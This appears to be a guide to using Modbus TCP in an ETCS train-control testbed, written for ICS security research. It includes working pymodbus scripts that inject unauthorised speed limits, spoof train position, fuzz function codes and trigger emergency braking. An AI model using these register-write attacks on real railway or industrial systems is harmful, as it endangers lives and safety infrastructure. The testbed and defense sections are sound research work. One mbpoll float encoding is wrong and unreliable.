# Modbus Protocol Guide for ETCS Testbed

## Overview
This guide explains how to use Modbus TCP protocol in the ETCS testbed for realistic ICS vulnerability testing and adversarial scenarios.

## Why Modbus?
Modbus is one of the most widely used protocols in Industrial Control Systems (ICS):
- **Ubiquity**: Found in SCADA systems, PLCs, RTUs worldwide
- **Simplicity**: Easy to implement and attack
- **Vulnerabilities**: No built-in authentication or encryption
- **Relevance**: Real-world ICS attacks often target Modbus

## Modbus Basics

### Protocol Structure
Modbus TCP uses a request-response model:
```
[MBAP Header][Function Code][Data]
```

- **MBAP** (7 bytes): Transaction ID, Protocol ID, Length, Unit ID
- **Function Code** (1 byte): Operation type (read, write, etc.)
- **Data** (variable): Register addresses and values

### Common Function Codes
- **01**: Read Coils
- **02**: Read Discrete Inputs
- **03**: Read Holding Registers ⭐ (used in ETCS)
- **04**: Read Input Registers
- **16**: Write Multiple Registers ⭐ (used in ETCS)

## ETCS Modbus Register Map

### Register Layout
The ETCS testbed maps messages to 19 Modbus holding registers:

| Registers | Field | Type | Description |
|-----------|-------|------|-------------|
| 0-1 | position_km | float32 | Current train position (km) |
| 2-3 | speed_kmh | float32 | Current train speed (km/h) |
| 4-5 | speed_limit | float32 | Authorized speed limit (km/h) |
| 6-7 | next_checkpoint_km | float32 | Next checkpoint position (km) |
| 8 | ma_id | uint16 | Movement Authority ID |
| 9 | message_type | uint16 | Message type code |
| 10 | train_id | uint16 | Train ID hash |
| 11-12 | timestamp | uint32 | Unix timestamp (split) |
| 13-18 | signature | 6×uint16 | HMAC signature (96 bits) |

### Message Type Codes
| Code | Type | Description |
|------|------|-------------|
| 0 | UNKNOWN | Invalid/unknown message |
| 1 | HELLO | Initial handshake |
| 2 | MA | Movement Authority |
| 3 | EMERGENCY_UPDATE | Emergency brake/slowdown |
| 4 | POSITION_REPORT | Train position update |
| 5 | CHECKPOINT_REACHED | Checkpoint notification |

### Floating Point Encoding
32-bit IEEE 754 floats are stored in big-endian format across two 16-bit registers:
```python
# Example: Encode 100.5 km/h
import struct
speed = 100.5
speed_bytes = struct.pack(">f", speed)
reg1, reg2 = struct.unpack(">HH", speed_bytes)
# reg1 and reg2 go into consecutive registers
```

## Configuration

### Enable Modbus Protocol
Set environment variable before starting components:
```bash
export PROTOCOL=modbus_tcp
export MODBUS_SLAVE_ID=1
export MODBUS_PORT=502
```

### Docker Compose
Update `docker-compose.yml`:
```yaml
services:
  rbc:
    environment:
      - PROTOCOL=modbus_tcp
      - MODBUS_SLAVE_ID=1
  
  evc:
    environment:
      - PROTOCOL=modbus_tcp
      - MODBUS_SLAVE_ID=1
```

### Verification
Check that components use Modbus:
```bash
# Start components
docker compose up

# Look for Modbus protocol messages in logs
# You should see register-based communication instead of JSON
```

## Usage Examples

### Python Client
```python
from protocols.modbus_tcp import ModbusTcpProtocol

# Create protocol instance
proto = ModbusTcpProtocol(key=b"secret-key", slave_id=1)

# Create Movement Authority
payload = {
    "type": "MA",
    "ma_id": 42,
    "position_km": 1.5,
    "speed_kmh": 0.0,
    "speed_limit": 100.0,
    "next_checkpoint_km": 5.3,
    "train_id": "TrainA",
    "timestamp": time.time(),
}

# Encode to Modbus registers
register_data = proto.encode(payload)
print(f"Encoded to {len(register_data)} bytes")

# Decode from registers
decoded = proto.decode(register_data)
print(f"Decoded: {decoded['payload']}")

# Verify signature
is_valid = proto.verify(decoded['payload'], decoded['signature'])
print(f"Signature valid: {is_valid}")
```

### Reading Registers with pymodbus
```python
from pymodbus.client import ModbusTcpClient

# Connect to Modbus server
client = ModbusTcpClient('127.0.0.1', port=502)
client.connect()

# Read 19 registers starting at address 0
result = client.read_holding_registers(0, 19, unit=1)

if not result.isError():
    registers = result.registers
    print(f"Read {len(registers)} registers")
    
    # Decode position (registers 0-1)
    import struct
    pos_bytes = struct.pack(">HH", registers[0], registers[1])
    position_km = struct.unpack(">f", pos_bytes)[0]
    print(f"Position: {position_km:.2f} km")
    
    # Decode speed limit (registers 4-5)
    limit_bytes = struct.pack(">HH", registers[4], registers[5])
    speed_limit = struct.unpack(">f", limit_bytes)[0]
    print(f"Speed limit: {speed_limit:.1f} km/h")
    
    # Read message type (register 9)
    msg_type = registers[9]
    type_names = {1: "HELLO", 2: "MA", 3: "EMERGENCY_UPDATE", 
                  4: "POSITION_REPORT", 5: "CHECKPOINT_REACHED"}
    print(f"Message type: {type_names.get(msg_type, 'UNKNOWN')}")

client.close()
```

### Writing Registers (Attack Scenario)
```python
from pymodbus.client import ModbusTcpClient
import struct

# Connect
client = ModbusTcpClient('127.0.0.1', port=502)
client.connect()

# Inject overspeed limit: 250 km/h
speed_limit = 250.0
speed_bytes = struct.pack(">f", speed_limit)
reg1, reg2 = struct.unpack(">HH", speed_bytes)

# Write to registers 4-5 (speed_limit)
result = client.write_registers(4, [reg1, reg2], unit=1)

if not result.isError():
    print(f"Successfully injected speed limit: {speed_limit} km/h")
else:
    print(f"Write failed: {result}")

client.close()
```

## Attack Scenarios

### 1. Unauthorized Speed Limit Change
**Vulnerability**: No authentication required for register writes

```python
from attacks.modbus_exploits import ModbusAttacks

atk = ModbusAttacks(target_host="127.0.0.1", target_port=502)

# Write dangerous speed limit
atk.overspeed_via_registers(speed_limit=300.0)
```

**Expected Impact**:
- Train accelerates to 300 km/h
- DMI shows new limit
- No alarms (vulnerability demonstration)

### 2. Position Spoofing
**Vulnerability**: Position can be manipulated without authorization

```python
atk = ModbusAttacks()

# Teleport train to position 99.9 km
atk.manipulate_position(position_km=99.9)
```

**Expected Impact**:
- RBC thinks train is at wrong position
- May issue inappropriate authority
- Collision risk in multi-train scenarios

### 3. Function Code Fuzzing
**Vulnerability**: Discover supported/hidden function codes

```python
atk = ModbusAttacks()

# Test function codes 1-255
results = atk.function_code_fuzzing(max_attempts=255)

for code, status in results.items():
    if status == "ACCEPTED":
        print(f"Function code {code} is accepted!")
```

**Expected Impact**:
- Discover debug/maintenance functions
- Find undocumented capabilities
- Identify potential backdoors

### 4. Register Scanning
**Vulnerability**: No access control on register reads

```python
atk = ModbusAttacks()

# Scan registers 0-100
registers = atk.register_scanning(start=0, count=100)

# Look for sensitive data
for addr, value in registers.items():
    print(f"Register {addr}: 0x{value:04X} ({value})")
```

**Expected Impact**:
- Discover internal state
- Find cryptographic material
- Map system configuration

### 5. Emergency Brake Injection
**Vulnerability**: Message type can be changed without signature

```python
atk = ModbusAttacks()

# Inject emergency update type
atk.inject_emergency_update()
```

**Expected Impact**:
- Train applies emergency brake
- Service disruption
- Safety system abuse

## Defense Mechanisms

### 1. Enable Signature Verification
Keep EVC in STRICT mode (default):
```bash
# Via driver interface
echo "UNSIGNED OFF" | nc 127.0.0.1 9102
```

### 2. Use Strong Keys
Replace default key in `rbc_key.txt`:
```bash
# Generate random 256-bit key
openssl rand -hex 32 > rbc_key.txt
```

### 3. Firewall Rules
Restrict Modbus port access:
```bash
# Allow only from specific hosts
iptables -A INPUT -p tcp --dport 502 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 502 -j DROP
```

### 4. Intrusion Detection
Monitor for suspicious patterns:
- Excessive Function Code 16 (writes)
- Invalid register addresses
- Rapid-fire requests
- Out-of-range values

### 5. Physical Security
In real deployments:
- Isolate Modbus networks (air gap)
- Use Modbus/TCP security extensions
- Deploy network segmentation
- Implement role-based access

## Troubleshooting

### Protocol Mismatch Error
**Symptom**: Components can't communicate

**Solution**: Ensure all components use same protocol:
```bash
# Check environment
echo $PROTOCOL

# Set consistently
export PROTOCOL=modbus_tcp
```

### Register Decode Error
**Symptom**: "Invalid Modbus data length" exception

**Cause**: Incomplete register data (< 38 bytes)

**Solution**: Ensure full register set is transmitted

### Signature Verification Fails
**Symptom**: EVC rejects valid MAs

**Cause**: Key mismatch or truncated HMAC

**Solution**: 
1. Check `rbc_key.txt` matches on RBC and EVC
2. Verify signature length (96 bits minimum)

### Floating Point Precision
**Symptom**: Small differences in decoded values

**Cause**: IEEE 754 rounding

**Solution**: Accept ~0.01 tolerance for floats

## Testing Tools

### mbpoll (Command-line Modbus Client)
```bash
# Install
sudo apt-get install mbpoll

# Read registers 0-19
mbpoll -a 1 -r 1 -c 19 -t 4 127.0.0.1

# Write register 4-5 (speed_limit = 150.0)
# First encode 150.0 as float, then write registers
mbpoll -a 1 -r 5 -t 4 127.0.0.1 16595 18022
```

### mbtget (Modbus TCP CLI)
```bash
# Read registers
mbtget -h 127.0.0.1 -p 502 -a 1 -r 0 -n 19

# Write register
mbtget -h 127.0.0.1 -p 502 -a 1 -w 5 -v 16595
```

### Python pymodbus REPL
```bash
python -m pymodbus.console tcp --host 127.0.0.1 --port 502
```

## Performance Notes

### Latency
- Encoding: ~2-3 ms (vs ~1 ms for JSON)
- Decoding: ~2-3 ms
- Network: Same as JSON (~10-50 ms localhost)

### Overhead
- Register format: 38 bytes minimum
- JSON format: ~150-200 bytes typical
- Modbus is more efficient for wire protocol

### Throughput
- JSON: ~1000 msg/s
- Modbus: ~500 msg/s (conversion overhead)

## References

- [Modbus Protocol Specification](http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf)
- [Modbus Security Whitepaper](http://www.modbus.org/docs/MB-Security_v21_2018-07-24.pdf)
- [pymodbus Documentation](https://pymodbus.readthedocs.io/)
- [ICS-CERT Advisories](https://www.cisa.gov/ics/advisories)

## Next Steps

1. ✅ Understand register mapping
2. ✅ Configure Modbus protocol
3. ✅ Run basic read/write tests
4. ▶ Execute attack scenarios
5. ▶ Test with CALDERA
6. ▶ Document findings
